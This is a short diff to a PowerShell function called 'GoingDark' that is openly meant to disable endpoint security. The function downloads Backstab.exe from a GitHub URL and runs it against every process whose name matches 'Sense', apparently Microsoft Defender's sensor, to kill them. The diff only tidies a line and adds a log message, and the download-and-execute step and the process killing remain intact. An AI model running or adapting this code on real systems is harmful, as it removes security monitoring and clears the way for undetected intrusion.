@@ -27,9 +27,8 @@ function GoingDark() {
     Write-Host "[i] Downloading backstab"
     Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $downloadDirectory\Backstab.exe
     Write-Host "[i] Running backstab"
-    & $downloadDirectory\Backstab.exe
-
     # killing all sense processes
+    Write-Host "[i] Killing all Sense processes"
     Get-Process | Where-Object {$_.ProcessName -like "*Sense*"} | ForEach-Object {& $downloadDirectory\Backstab.exe -n $_.Id -k}
 }
 
